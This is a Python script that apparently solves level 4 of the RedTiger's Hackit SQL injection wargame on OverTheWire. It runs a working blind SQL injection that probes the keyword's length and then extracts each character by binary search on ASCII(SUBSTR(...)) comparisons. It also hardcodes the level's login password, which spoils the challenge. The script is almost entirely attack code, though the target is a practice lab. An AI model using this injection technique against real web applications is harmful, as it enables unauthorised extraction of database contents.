import requests


def search(p, l, r):
    if l > r:
        return False
    x = (l + r) // 2
    re = s.post(url + order % (p, '=', x), data=login)
    if '1 rows.' in re.text:
        return chr(x)
    re = s.post(url + order % (p, '>', x), data=login)
    if '1 rows.' in re.text:
        return search(p, x + 1, r)
    else:
        return search(p, l, x - 1)

s = requests.Session()
login = {'password': 'dont_publish_solutions_GRR!',
         'level4login': 'Login'}
url = 'http://redtiger.labs.overthewire.org/level4.php'

order = '?id=1 and length(keyword)>'

i = 16
while i < 32767:
    re = s.post(url + order + str(i), data=login)
    if '0 rows.' in re.text:
        length = i
        break
    i = i + 1
print 'length=', length
keyword = ''
order = '?id=1 and ASCII(SUBSTR(keyword,%d,1))%s%d'
for i in range(1, length + 1):
    keyword = keyword + search(i, 32, 126)
    print i, '/', length, keyword
print 'keyword=', keyword
